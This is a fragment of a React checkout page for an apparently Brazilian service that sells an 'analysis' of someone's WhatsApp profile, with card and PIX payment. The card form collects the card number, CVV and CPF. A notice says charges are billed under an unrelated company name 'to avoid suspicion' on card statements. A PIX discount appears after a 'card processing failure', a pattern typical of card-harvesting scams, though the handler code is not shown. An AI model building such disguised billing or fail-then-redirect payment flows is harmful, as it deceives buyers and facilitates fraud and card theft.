                      paymentMethod === 'card'
                        ? 'transform scale-105'
                        : 'hover:scale-102'
                    }`}
                  >
                    <div className={`relative p-8 rounded-3xl transition-all duration-300 ${
                      paymentMethod === 'card'
                        ? 'bg-white border-3 border-red-500 shadow-2xl shadow-red-500/30'
                        : 'bg-white border-2 border-gray-200 hover:border-red-300 hover:shadow-xl'
                    }`}>
                      {/* Ícone */}
                      <div className="flex justify-center mb-6">
                        <div className={`relative p-5 rounded-2xl transition-all duration-300 ${
                          paymentMethod === 'card'
                            ? 'bg-red-50 border-2 border-red-200'
                            : 'bg-gray-100 group-hover:bg-red-50'
                        }`}>
                          <CreditCard className="w-12 h-12 text-gray-700 group-hover:text-red-600" />
                        </div>
                      </div>
                      
                      {/* Conteúdo */}
                      <div className="text-center">
                        <h3 className="font-bold text-2xl mb-3 text-gray-900">
                          Cartão de Crédito
                        </h3>
                        <p className="text-gray-600 mb-4 text-sm">
                          Visa • Mastercard • Elo • Amex
                        </p>
                        <div className="flex items-center justify-center gap-2 text-sm">
                          <Shield className="w-4 h-4 text-green-600" />
                          <span className="text-gray-700 font-medium">Pagamento Seguro</span>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* PIX - REDESENHADO */}
                  <div
                    onClick={() => setPaymentMethod('pix')}
                    className={`relative cursor-pointer group transition-all duration-300 ${
                      paymentMethod === 'pix'
                        ? 'transform scale-105'
                        : 'hover:scale-102'
                    }`}
                  >
                    <div className={`relative p-8 rounded-3xl transition-all duration-300 ${
                      paymentMethod === 'pix'
                        ? 'bg-white border-3 border-green-500 shadow-2xl shadow-green-500/30'
                        : 'bg-white border-2 border-gray-200 hover:border-green-300 hover:shadow-xl'
                    }`}>
                      {/* Ícone PIX */}
                      <div className="flex justify-center mb-6">
                        <div className={`relative p-5 rounded-2xl transition-all duration-300 ${
                          paymentMethod === 'pix'
                            ? 'bg-green-50 border-2 border-green-200'
                            : 'bg-gray-100 group-hover:bg-green-50'
                        }`}>
                          <svg className="w-12 h-12 text-gray-700 group-hover:text-green-600" viewBox="0 0 512 512" fill="currentColor">
                            <path d="M242.4 292.5C247.8 287.1 257.1 287.1 262.5 292.5L339.5 369.5C353.7 383.7 372.6 391.5 392.6 391.5H407.7L310.6 488.6C280.3 518.1 231.1 518.1 200.8 488.6L103.3 391.2H112.6C132.6 391.2 151.5 383.4 165.7 369.2L242.4 292.5zM262.5 218.9C257.1 224.3 247.8 224.3 242.4 218.9L165.7 142.2C151.5 127.1 132.6 120.2 112.6 120.2H103.3L200.7 22.8C231.1-7.6 280.3-7.6 310.6 22.8L407.8 120H392.6C372.6 120 353.7 127.8 339.5 142L262.5 218.9zM112.6 142.7C126.4 142.7 139.1 148.3 149.7 158.1L226.4 234.8C233.6 241.1 243 245.6 252.5 245.6C261.9 245.6 271.3 241.1 278.5 234.8L355.5 157.8C365.3 148.1 378.8 142.5 392.6 142.5H430.3L488.6 200.8C518.9 231.1 518.9 280.3 488.6 310.6L430.3 368.9H392.6C378.8 368.9 365.3 363.3 355.5 353.5L278.5 276.5C264.6 262.6 240.3 262.6 226.4 276.5L149.7 353.2C139.1 363 126.4 368.6 112.6 368.6H80.78L22.76 310.6C-7.586 280.3-7.586 231.1 22.76 200.8L80.78 142.7H112.6z"/>
                          </svg>
                        </div>
                      </div>
                      
                      {/* Conteúdo */}
                      <div className="text-center">
                        <h3 className="font-bold text-2xl mb-3 text-gray-900">
                          PIX
                        </h3>
                        <p className="text-gray-600 mb-4 text-sm">
                          Pagamento instantâneo e seguro
                        </p>
                        <div className="flex items-center justify-center gap-2 text-sm">
                          <CheckCircle className="w-4 h-4 text-green-600" />
                          <span className="text-green-600 font-semibold">Aprovação Imediata</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Payment Form - PIX */}
                {paymentMethod === 'pix' && (
                  <div className="max-w-2xl mx-auto">
                    {showPixDiscount && (
                      <div className="bg-gradient-to-r from-yellow-50 to-orange-50 border-2 border-yellow-400 rounded-2xl p-6 mb-6 shadow-lg">
                        <div className="flex items-center gap-4">
                          <div className="bg-yellow-400 p-3 rounded-full flex-shrink-0">
                            <Star className="w-8 h-8 text-white" />
                          </div>
                          <div className="flex-1">
                            <h4 className="text-2xl font-bold text-yellow-900 mb-2">
                              🎉 Desconto Especial de 20% Ativado!
                            </h4>
                            <p className="text-yellow-800 text-base mb-4">
                              Devido à falha no processamento do cartão, você ganhou um desconto exclusivo no PIX!
                            </p>
                            <div className="flex items-center gap-3 flex-wrap">
                              <div className="flex items-baseline gap-1.5">
                                <span className="text-xs text-yellow-700 font-medium">De:</span>
                                <span className="text-lg text-yellow-700 line-through">
                                  R$ {selectedPlan === 'premium' ? '9,99' : '4,99'}
                                </span>
                              </div>
                              <div className="flex items-baseline gap-1.5">
                                <span className="text-xs text-yellow-900 font-medium">Por:</span>
                                <span className="text-2xl font-bold text-green-700">
                                  R$ {selectedPlan === 'premium' ? '7,99' : '3,99'}
                                </span>
                              </div>
                              <span className="bg-yellow-400 text-yellow-900 px-3 py-1 rounded-full text-xs font-bold shadow-sm">
                                -20% OFF
                              </span>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                    <QRCodePix 
                      amount={showPixDiscount 
                        ? (selectedPlan === 'premium' ? 7.99 : 3.99)
                        : (selectedPlan === 'premium' ? 9.99 : 4.99)
                      }
                      whatsapp={analysisData?.whatsapp}
                      nome={profileData?.name || profileData?.pushName || profileData?.verifiedName || 'Usuário'}
                      onPaymentConfirmed={handlePixPayment}
                    />
                  </div>
                )}

                {/* Payment Form - Cartão */}
                {paymentMethod === 'card' && (
                  <div className="max-w-2xl mx-auto">
                    <div className="space-y-4">
                      {/* Observação sobre fatura */}
                      <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-4">
                        <div className="flex items-start">
                          <div className="text-blue-600 mr-3 mt-0.5">ℹ️</div>
                          <div>
                            <h4 className="font-semibold text-blue-800 mb-1">Observação Importante</h4>
                            <p className="text-blue-700 text-sm">
                              A fatura estará em nome de <strong>Comércio e Varejista Papel Pardo</strong> para evitar desconfianças em faturas de cartão.
                            </p>
                          </div>
                        </div>
                      </div>

                      <div className="grid md:grid-cols-2 gap-4">
                        <div>
                          <label className="block text-sm font-semibold text-gray-800 mb-2">
                            Número do Cartão *
                          </label>
                          <input
                            type="text"
                            name="cardNumber"
                            value={cardData.cardNumber}
                            onChange={handleCardInputChange}
                            placeholder="1234 5678 9012 3456"
                            className="input-field"
                            maxLength={19}
                            inputMode="numeric"
                            required
                          />
                        </div>
                        <div>
                          <label className="block text-sm font-semibold text-gray-800 mb-2">
                            Nome no Cartão *
                          </label>
                          <input
                            type="text"
                            name="cardHolder"
                            value={cardData.cardHolder}
                            onChange={handleCardInputChange}
                            placeholder="NOME COMPLETO"
                            className="input-field"
                            required
                          />
                        </div>
                      </div>

                      <div className="grid md:grid-cols-3 gap-4">
                        <div>
                          <label className="block text-sm font-semibold text-gray-800 mb-2">
                            Validade *
                          </label>
                          <input
                            type="text"
                            name="expiryDate"
                            value={cardData.expiryDate}
                            onChange={handleCardInputChange}
                            placeholder="MM/AA"
                            className="input-field"
                            maxLength={5}
                            inputMode="numeric"
                            required
                          />
                        </div>
                        <div>
                          <label className="block text-sm font-semibold text-gray-800 mb-2">
                            CVV *
                          </label>
                          <input
                            type="text"
                            name="cvv"
                            value={cardData.cvv}
                            onChange={handleCardInputChange}
                            placeholder="123"
                            className="input-field"
                            maxLength={3}
                            inputMode="numeric"
                            required
                          />
                        </div>
                        <div>
                          <label className="block text-sm font-semibold text-gray-800 mb-2">
                            CPF *
                          </label>
                          <input
                            type="text"
                            name="cpf"
                            value={cardData.cpf}
                            onChange={handleCardInputChange}
                            placeholder="000.000.000-00"
                            className="input-field"
                            maxLength={14}
                            inputMode="numeric"
                            required
                          />
                        </div>
                      </div>

                      <div className="grid md:grid-cols-2 gap-4">
                        <div>
                          <label className="block text-sm font-semibold text-gray-800 mb-2">
                            E-mail
                          </label>
                          <input
                            type="email"
                            name="email"
                            value={cardData.email}
                            onChange={handleCardInputChange}
                            placeholder="seu@email.com"
                            className="input-field"
                            pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
                          />
                        </div>
                        <div>
                          <label className="block text-sm font-semibold text-gray-800 mb-2">
                            Telefone
                          </label>
                          <input
                            type="tel"
                            name="phone"
                            value={cardData.phone}
                            onChange={handleCardInputChange}
                            placeholder="(11) 99999-9999"
                            className="input-field"
                          />
                        </div>
                      </div>

                      {cardError && (
                        <div className="bg-red-50 border border-red-200 rounded-xl p-4">
                          <div className="flex items-start">
                            <AlertTriangle className="w-5 h-5 text-red-600 mr-3 mt-0.5" />
                            <div>
                              <h4 className="font-semibold text-red-800 mb-1">Erro no Pagamento</h4>
                              <p className="text-red-700 text-sm">{cardError}</p>
                            </div>
                          </div>
                        </div>
                      )}

                      <button
                        onClick={handleCardPayment}
                        disabled={isProcessing}
                        className="w-full btn-primary"
                      >
                        {isProcessing ? (
                          <div className="flex items-center justify-center">
                            <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-white mr-3"></div>
                            Processando Pagamento...
                          </div>
                        ) : (
                          <>
                            <CreditCard className="w-6 h-6 inline mr-2" />
                            PAGAR R$ {selectedPlan === 'basic' ? '4,99' : '9,99'}
                          </>
                        )}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Security Notice */}
          <div className="glass-card p-8 text-center floating-element">
            <div className="flex items-center justify-center mb-6">
              <div className="relative">
                <div className="bg-green-500/20 p-4 rounded-full border-2 border-green-500/50">
                  <CheckCircle className="w-12 h-12 text-green-400" />
                </div>
                <div className="absolute -inset-1 bg-green-500/20 rounded-full animate-pulse"></div>
              </div>
            </div>
            <h3 className="font-bold text-2xl text-gray-800 mb-4">
              🔒 Análise 100% Segura e Anônima
            </h3>
            <p className="text-gray-700 text-lg">
              Seus dados são criptografados e não são armazenados em nossos servidores.
            </p>
            <div className="grid md:grid-cols-3 gap-4 mt-6">
              <div className="flex items-center justify-center text-green-400">
                <CheckCircle className="w-5 h-5 mr-2" />
                <span className="text-sm">Criptografado</span>
              </div>
              <div className="flex items-center justify-center text-blue-400">
                <CheckCircle className="w-5 h-5 mr-2" />
                <span className="text-sm">Anônimo</span>
              </div>
              <div className="flex items-center justify-center text-purple-400">
                <CheckCircle className="w-5 h-5 mr-2" />
                <span className="text-sm">Seguro</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

export default AnalysisPage
